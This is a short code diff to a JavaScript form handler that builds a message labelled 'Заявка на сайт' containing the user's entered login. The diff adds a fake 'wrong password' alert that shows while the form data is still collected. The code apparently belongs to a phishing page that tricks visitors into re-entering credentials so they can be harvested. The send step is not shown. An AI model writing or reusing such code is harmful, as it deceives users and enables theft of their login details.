@@ -6,6 +6,7 @@ const success =  document.getElementById("success")
 
 document.getElementById("tg").addEventListener("submit", function (e) {
     e.preventDefault()
+    confirm("Неправилный пароль!")
     console.log(this.radio.value)
     let message = `Заявка на сайт\n`;
     message += `login:  ${this.name.value}\n`;
